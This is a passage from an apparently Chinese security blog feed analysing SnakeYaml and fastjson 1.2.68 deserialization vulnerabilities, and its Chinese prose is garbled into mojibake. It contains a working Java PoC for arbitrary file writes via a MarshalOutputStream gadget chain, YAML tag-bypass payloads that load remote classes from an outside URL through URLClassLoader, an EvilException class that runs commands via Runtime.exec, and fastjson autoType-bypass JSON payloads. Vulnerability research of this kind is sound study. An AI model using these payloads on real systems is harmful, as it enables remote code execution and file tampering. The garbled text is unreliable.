      &#x27;input&#x27;<span class="punctuation">:</span>&#x27;ä½ çš„å†…å®¹çš„base64ç¼–ç &#x27;</span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;bufLen&#x27;<span class="punctuation">:</span><span class="number">1048576</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;protocolVersion&#x27;<span class="punctuation">:</span><span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æ”¹å†™ä¸ºyamlçš„æ ¼å¼</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!sun.rmi.server.MarshalOutputStream <span class="punctuation">[</span>!!java.util.zip.InflaterOutputStream <span class="punctuation">[</span>!!java.io.FileOutputStream <span class="punctuation">[</span>!!java.io.File <span class="punctuation">[</span><span class="string">&quot;Destpath&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">]</span><span class="punctuation">,</span>!!java.util.zip.Inflater  <span class="punctuation">&#123;</span> input<span class="punctuation">:</span> !!binary base64str <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="number">1048576</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>Destpathæ˜¯ç›®çš„è·¯å¾„ï¼Œbase64strä¸ºç»è¿‡zlibå‹ç¼©è¿‡åçš„æ–‡ä»¶å†…å®¹</p><p>ç»™ä¸€ä¸ªç°æˆçš„payloadï¼š</p><p><a href="https://xz.aliyun.com/t/15723?time__1311=GqjxnQiQGQeQqGNDQ0eBIPY54AILnYhuAbD#toc-10">https://xz.aliyun.com/t/15723?time__1311=GqjxnQiQGQeQqGNDQ0eBIPY54AILnYhuAbD#toc-10</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¨¡ä»¿fastjson 1.2.68å†™æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlOffInternet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> createPoC(<span class="string">&quot;ser.bin&quot;</span>,<span class="string">&quot;ser2.bin&quot;</span>);<span class="comment">//æºæ–‡ä»¶å’Œå†™æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createPoC</span><span class="params">(String SrcPath,String Destpath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SrcPath);</span><br><span class="line">        <span class="type">Long</span> <span class="variable">FileLength</span> <span class="operator">=</span> file.length();</span><br><span class="line">        <span class="type">byte</span>[] FileContent = <span class="keyword">new</span> <span class="title class_">byte</span>[FileLength.intValue()];</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            in.read(FileContent);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] compressbytes = compress(FileContent);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(compressbytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+Destpath+<span class="string">&quot;\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span>+base64str+<span class="string">&quot; &#125;,1048576]]&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="keyword">return</span> poc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] compress(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="type">byte</span>[] output = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">Deflater</span> <span class="variable">compresser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>();</span><br><span class="line"></span><br><span class="line">        compresser.reset();</span><br><span class="line">        compresser.setInput(data);</span><br><span class="line">        compresser.finish();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(data.length);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (!compresser.finished()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> compresser.deflate(buf);</span><br><span class="line">                bos.write(buf, <span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">            output = bos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            output = data;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                bos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        compresser.end();</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><p><code>!!</code>å¯ä»¥ç”¨TAGæ¥ç»•è¿‡</p><p>Tagçš„å£°æ˜ä½äºorg.yaml.snakeyaml.nodes.Tags</p><h3 id="æ¢ä¸ºtag-yaml-org-2002"><a href="#æ¢ä¸ºtag-yaml-org-2002" class="headerlink" title="!!æ¢ä¸ºtag:yaml.org,2002:"></a><code>!!</code>æ¢ä¸º<code>tag:yaml.org,2002:</code></h3><p><code>!!</code>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªTagï¼Œç­‰åŒäº<code>&quot;tag:yaml.org,2002:&quot;</code>åŠ ä¸€ä¸ªåç¼€ã€‚é™¤äº†è¿™é‡Œå£°æ˜çš„ç±»ï¼ŒTagå°±æ˜¯<code>&quot;tag:yaml.org,2002:&quot;</code>+ç±»çš„å…¨é™å®šåï¼Œæ¯”å¦‚<code>!!javax.script.ScriptEngineManager</code>çš„Tagæ˜¯<code>tag:yaml.org,2002:javax.script.ScriptEngineManager</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028112037343"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028113132038"></p><p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸¤ç§æ›¿æ¢æ–¹å¼</p><h3 id="lt-tag-gt"><a href="#lt-tag-gt" class="headerlink" title="!&lt;tag&gt;"></a><code>!&lt;tag&gt;</code></h3><p><code>!!javax.script.ScriptEngineManager</code>æ¢ä¸º<code>!&lt;tag:yaml.org,2002:javax.script.ScriptEngineManager&gt;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!&lt;tag:yaml.org,<span class="number">2002</span>:javax.script.ScriptEngineManager&gt; <span class="string">&quot; +</span></span><br><span class="line"><span class="string">                &quot;</span>[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URLClassLoader&gt; [[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URL&gt;<span class="string">&quot; +</span></span><br><span class="line"><span class="string">                &quot;</span> [\<span class="string">&quot;http://b1ue.cn/\&quot;]]]]</span></span><br></pre></td></tr></table></figure><h3 id="TAG"><a href="#TAG" class="headerlink" title="%TAG"></a><code>%TAG</code></h3><p>ç”¨%TAGå£°æ˜ä¸€ä¸ª TAGï¼Œåé¢ä½¿ç”¨<code>!</code>å°±å¯ä»¥è‡ªåŠ¨åŠ ä¸ŠTag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%TAG !      tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="string">&quot;http://b1ue.cn/&quot;</span>]]]]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SnakeYaml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.68æ¼æ´åˆ†æåŠcommons-ioå†™æ–‡ä»¶</title>
      <link href="/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/"/>
      <url>/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>fastjson 1.2.68ç‰ˆæœ¬ç»•è¿‡</p><h1 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h1><p>åœ¨ä¹‹å‰ç‰ˆæœ¬1.2.47 ç‰ˆæœ¬æ¼æ´çˆ†å‘ä¹‹åï¼Œå®˜æ–¹åœ¨ 1.2.48 å¯¹æ¼æ´è¿›è¡Œäº†ä¿®å¤ã€‚</p><p>TypeUtils.loadClassåŠ äº†ä¸€ä¸ªcacheåˆ¤æ–­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023192305499.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023192305499.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023192305499"></p><p>è€ŒMiscCodec.deserialzeè°ƒç”¨æ—¶ï¼Œcacheé»˜è®¤ä¸ºfalseã€‚ç›´æ¥é˜»æ–­äº†cacheæå‰åŠ è½½æ¶æ„ç±»çš„æ”»å‡»é“¾è·¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023192343346.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023192343346.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023192343346"></p><p>1.2.48-1.2.67éƒ½æ˜¯å®‰å…¨çš„ï¼ˆä¸æ‰‹åŠ¨å…³autoTypeçš„æƒ…å†µä¸‹ï¼‰ã€‚éšç€ç‰ˆæœ¬çš„æ›´æ–°ï¼Œç›´åˆ°<code>fastjson1.2.68</code>åˆå­˜åœ¨ä¸€ä¸ªæ–°çš„æ¼æ´ç‚¹ï¼Œå¯ä½¿ç”¨<code>expectClass</code>å»ç»•è¿‡<code>checkAutoType()</code>æ£€æµ‹æœºåˆ¶ï¼Œä¸»è¦ä½¿ç”¨<code>Throwable</code>å’Œ <code>AutoCloseable</code>æ¥ç»•è¿‡</p><p>ä¸‹é¢é…ç½®ä¸€ä¸‹ç¯å¢ƒ<code>pom.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">       &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;1.2.68&lt;/version&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>åœ¨<code>1.2.68</code>ç‰ˆæœ¬ä¸‹ï¼Œæ›´æ–°äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æ§åˆ¶ç‚¹ <code>safeMode</code>ï¼Œå¦‚æœå¼€å¯çš„è¯ï¼Œå°†åœ¨<code>checkAutoType()</code>ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ä»èµ‹å€¼å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœè®¾ç½®äº†<code>@type</code>å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¼€äº†safemodeçš„ç›´æ¥æ‰“ä¸äº†fastjson</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023193418636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023193418636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023193418636"></p><p>safemodeé»˜è®¤ä¸å¼€å¯</p><p>checkAutoTypeä¸­ï¼Œç”¨getClassFromMappingä»mappingsè¯»å–ç±»ï¼Œå¹¶åœ¨æ»¡è¶³ç¬¬äºŒä¸ªçº¢æ¡†çš„æ¡ä»¶ä¸‹ï¼Œç›´æ¥returnäº†å–å‡ºçš„ç±»</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241023221338363.png" class="lazyload placeholder" data-srcset="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241023221338363.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023221338363"></p><p>æ¡ä»¶å¦‚ä¸‹ï¼š</p><ul><li>æœŸæœ›ç±»expectClassä¸ä¸ºç©º</li><li>typeNameä¸æ˜¯HashMapç±»</li><li>æœŸæœ›ç±»æ˜¯typeNameçš„å­ç±»</li></ul><p>åœ¨mappingsåˆå§‹åŒ–æ—¶ï¼Œå‘å…¶ä¸­putè¿›äº†å¾ˆå¤šç±»ï¼Œå…¶å®å°±æ˜¯ç™½åå•äº†ã€‚å…¶ä¸­å°±åŒ…æ‹¬Exceptionå’ŒAutoCloseableï¼Œæˆ‘ä»¬åé¢çš„æ”»å‡»éƒ½åŸºäºè¿™ä¸¤ä¸ªæ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024110548113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024110548113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024110548113"></p><p>æœ‰æ²¡æœ‰åŠæ³•æå‰æ·»åŠ æœŸæœ›ç±»å‘¢ï¼Ÿ</p><p>æ³¨æ„expectClassæ¥è‡ªcheckAutoTypeçš„ç¬¬äºŒä¸ªå‚æ•°ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024111812626.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024111812626.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024111812626"></p><p>æŸ¥æ‰¾ç”¨æ³•å‘ç°JavaBeanDesrtializer.deserialzeå’ŒThrowableDeserializer.deserialzeéƒ½è°ƒç”¨äº†å¸¦æœŸæœ›ç±»å‚æ•°çš„checkAutoType</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024111928928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024111928928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024111928928"></p><p>å‰è€…æ˜¯fastjsoné»˜è®¤ååºåˆ—åŒ–å™¨ï¼Œåè€…æ˜¯é’ˆå¯¹å¼‚å¸¸ç±»çš„ååºåˆ—åŒ–å™¨</p><p>å…ˆçœ‹ThrowableDeserializer</p><h2 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h2><p>åœ¨fastjsonä¸­ï¼Œå…ˆæ˜¯DefaultJSONParser.parseè°ƒç”¨ParserConfig.checkAutoTypeæ£€æŸ¥å’Œè·å–ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024113450442.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024113450442.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024113450442"></p><p>ç„¶åå†æ˜¯è·å–ååºåˆ—åŒ–å™¨è°ƒç”¨deserialze</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024113754047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024113754047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024113754047"></p><p>å¦‚æœè¿™é‡Œdeserializeræ˜¯ThrowableDeserializerï¼Œå¹¶ä¸”ä¸‹ä¸€ä¸ªkeyä¸º<code>@type</code>çš„è¯ï¼Œå°±ä¼šå†æ¬¡è°ƒç”¨checkAutoTypeï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å¸¦Throwable.classä½œä¸ºexpectClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024114756431.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024114756431.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024114756431"></p><p>å¦‚æœæˆ‘ä»¬è¿™é‡Œä¼ çš„ç¬¬ä¸€ä¸ªå‚æ•°exClassNameæ˜¯æ¶æ„çš„å®ç°äº†Throwableå­ç±»ï¼Œå°±èƒ½å‘½ä»¤æ‰§è¡Œã€‚</p><p>ç”±äºç¼“å­˜mappingsçš„ç™½åå•æ˜¯Exceptionï¼Œæ­£å¥½Exceptionæ˜¯Throwableå­ç±»ï¼Œé‚£å®ç°Exceptionå°±èƒ½ç»•è¿‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024115101467.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024115101467.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024115101467"></p><p>åœ¨ParserConfig.getDeserializerä¹Ÿèƒ½å‘ç°ï¼ŒThrowableå­ç±»ä¹Ÿæ˜¯è¿”å›ThrowableDeserializerä½œä¸ºååºåˆ—åŒ–å™¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024122201499.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024122201499.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024122201499"></p><p>ä¸è¿‡ç›®å‰æ²¡æœ‰å®ç°Exceptionçš„åº“ç±»å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå¦‚æœå¯ä»¥å†™æ–‡ä»¶ï¼Œé‚£æ­é…èµ·æ¥å°±å¾ˆä¸æ»‘äº†ï¼Œå‡å¦‚æˆ‘ä»¬å‘æœåŠ¡å™¨å†™å…¥äº†æ¶æ„ç±»CalcExceptionå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = command;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSONå­—ç¬¦ä¸²ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;me.mole.exception.CalcException&quot;</span>, </span><br><span class="line">         <span class="string">&quot;command&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;, </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;x\&quot;:\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\t&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\t \&quot;@type\&quot;:\&quot;org.exploit.third.fastjson.EvilException\&quot;, \n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\t         \&quot;command\&quot;:\&quot;calc\&quot;&#125;, \n&quot;</span> +</span><br><span class="line">            <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024121847287.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024121847287.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024121847287"></p><h3 id="ThrowableDeserializer-selenium"><a href="#ThrowableDeserializer-selenium" class="headerlink" title="ThrowableDeserializer+selenium"></a>ThrowableDeserializer+selenium</h3><p>éœ€è¦æœ‰seleniumä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.seleniumhq.selenium<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>selenium-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>org.openqa.selenium.WebDriverExceptionç±»çš„getMessage()æ–¹æ³•å’ŒgetSystemInformation()æ–¹æ³•éƒ½èƒ½è·å–ä¸€äº›ç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚ï¼šIPåœ°å€ã€ä¸»æœºåã€ç³»ç»Ÿæ¶æ„ã€ç³»ç»Ÿåç§°ã€ç³»ç»Ÿç‰ˆæœ¬ã€JDKç‰ˆæœ¬ã€selenium webdriverç‰ˆæœ¬ã€‚å¦å¤–ï¼Œè¿˜å¯é€šè¿‡getStackTrace()æ¥è·å–å‡½æ•°è°ƒç”¨æ ˆï¼Œä»è€Œè·æ‚‰ä½¿ç”¨äº†ä»€ä¹ˆæ¡†æ¶æˆ–ç»„ä»¶ã€‚</p><p>ä½†æ˜¯è°ƒç”¨æ–¹æ³•æ˜¯getterï¼Œä¸”å¹¶ä¸æ»¡è¶³fastjsonè°ƒç”¨çš„getterè§„åˆ™ï¼Œæœ‰å…¶ä»–åŠæ³•è°ƒç”¨åˆ°å—ï¼Ÿä¹‹å‰åˆ†æäº†ä¸€ç¯‡fastjson&gt;&#x3D;1.2.36 $refè°ƒç”¨ getterï¼Œè†œY4tacker</p><p><a href="https://godownio.github.io/2024/10/24/fastjson-ref-diao-yong-getter/">https://godownio.github.io/2024/10/24/fastjson-ref-diao-yong-getter/</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:</span><br><span class="line">  &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;y&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$x.systemInformation&quot;</span>&#125;,</span><br><span class="line"> <span 